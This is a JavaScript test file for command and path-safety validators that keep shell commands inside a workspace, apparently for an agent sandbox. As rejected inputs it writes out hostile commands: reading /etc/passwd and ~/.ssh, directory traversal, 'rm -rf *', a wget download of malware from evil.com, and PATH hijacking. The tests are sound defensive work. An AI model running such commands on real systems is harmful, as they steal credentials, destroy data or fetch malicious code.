import { describe, expect, it } from 'vitest'
import { parseCommand, isCommandSafe } from '../src/utils/commandParser.js'
import { isPathEscaping, validatePaths } from '../src/utils/pathValidator.js'
import { isEscapingWorkspace } from '../src/safety.js'

describe('Command Parser Security', () => {
  describe('parseCommand', () => {
    it('should detect absolute paths', () => {
      const result = parseCommand('cat /etc/passwd')
      expect(result.hasAbsolutePath).toBe(true)
      expect(result.filePaths).toContain('/etc/passwd')
      expect(result.issues).toContain('Absolute path detected: /etc/passwd')
    })

    it('should detect parent directory traversal', () => {
      const result = parseCommand('cat ../../etc/passwd')
      expect(result.hasDangerousPattern).toBe(true)
      expect(result.issues).toContain('Parent directory traversal detected: ../../etc/passwd')
    })

    it('should detect home directory expansion', () => {
      const result = parseCommand('cat ~/secret.txt')
      expect(result.hasDangerousPattern).toBe(true)
      expect(result.issues).toContain('Home directory reference detected: ~/secret.txt')
    })

    it('should detect directory change commands', () => {
      const result = parseCommand('cd /tmp && rm -rf *')
      expect(result.hasDangerousPattern).toBe(true)
      expect(result.issues.some(i => i.includes('Directory change commands'))).toBe(true)
    })

    it('should allow safe commands', () => {
      const result = parseCommand('ls -la')
      expect(result.hasAbsolutePath).toBe(false)
      expect(result.hasDangerousPattern).toBe(false)
      expect(result.issues).toHaveLength(0)
    })
  })

  describe('isCommandSafe', () => {
    it('should reject commands with absolute paths', () => {
      const result = isCommandSafe('cat /etc/passwd')
      expect(result.safe).toBe(false)
      expect(result.reason).toBe('Command contains absolute paths')
    })

    it('should reject network commands', () => {
      const result = isCommandSafe('wget http://evil.com/malware.sh')
      expect(result.safe).toBe(false)
      expect(result.reason).toContain("Network command 'wget' is not allowed")
    })

    it('should reject cd commands', () => {
      const result = isCommandSafe('cd /tmp')
      expect(result.safe).toBe(false)
      expect(result.reason).toContain('Directory change commands')
    })

    it('should allow safe file operations', () => {
      expect(isCommandSafe('cat README.md').safe).toBe(true)
      expect(isCommandSafe('echo "test" > file.txt').safe).toBe(true)
      expect(isCommandSafe('grep pattern file.txt').safe).toBe(true)
    })
  })
})

describe('Path Validator Security', () => {
  const workspace = '/home/user/workspace'

  describe('isPathEscaping', () => {
    it('should detect escaping paths', () => {
      expect(isPathEscaping(workspace, '../etc/passwd')).toBe(true)
      expect(isPathEscaping(workspace, '/etc/passwd')).toBe(true)
      expect(isPathEscaping(workspace, 'subdir/../../outside')).toBe(true)
    })

    it('should allow safe paths', () => {
      expect(isPathEscaping(workspace, 'file.txt')).toBe(false)
      expect(isPathEscaping(workspace, 'subdir/file.txt')).toBe(false)
      expect(isPathEscaping(workspace, './subdir/file.txt')).toBe(false)
    })
  })

  describe('validatePaths', () => {
    it('should reject absolute paths', () => {
      const result = validatePaths(workspace, ['/etc/passwd', '/tmp/file'])
      expect(result.valid).toBe(false)
      expect(result.invalidPaths).toHaveLength(2)
      expect(result.invalidPaths[0].reason).toBe('Absolute path not allowed')
    })

    it('should reject parent traversal', () => {
      const result = validatePaths(workspace, ['../secret', 'ok.txt', '../../etc/passwd'])
      expect(result.valid).toBe(false)
      expect(result.invalidPaths).toHaveLength(2)
    })

    it('should allow valid paths', () => {
      const result = validatePaths(workspace, ['file.txt', 'subdir/file.txt', './another.txt'])
      expect(result.valid).toBe(true)
      expect(result.invalidPaths).toHaveLength(0)
    })
  })
})

describe('Safety Patterns', () => {
  describe('isEscapingWorkspace', () => {
    it('should detect cd commands', () => {
      expect(isEscapingWorkspace('cd /tmp')).toBe(true)
      expect(isEscapingWorkspace('pushd /etc')).toBe(true)
      expect(isEscapingWorkspace('popd')).toBe(true)
    })

    it('should detect environment manipulation', () => {
      expect(isEscapingWorkspace('export PATH=/evil/path:$PATH')).toBe(true)
      expect(isEscapingWorkspace('export HOME=/tmp')).toBe(true)
    })

    it('should detect shell expansion', () => {
      expect(isEscapingWorkspace('cat ~/secrets')).toBe(true)
      expect(isEscapingWorkspace('ls $HOME/.ssh')).toBe(true)
    })

    it('should allow safe commands', () => {
      expect(isEscapingWorkspace('ls -la')).toBe(false)
      expect(isEscapingWorkspace('cat README.md')).toBe(false)
      expect(isEscapingWorkspace('echo "test"')).toBe(false)
    })
  })
})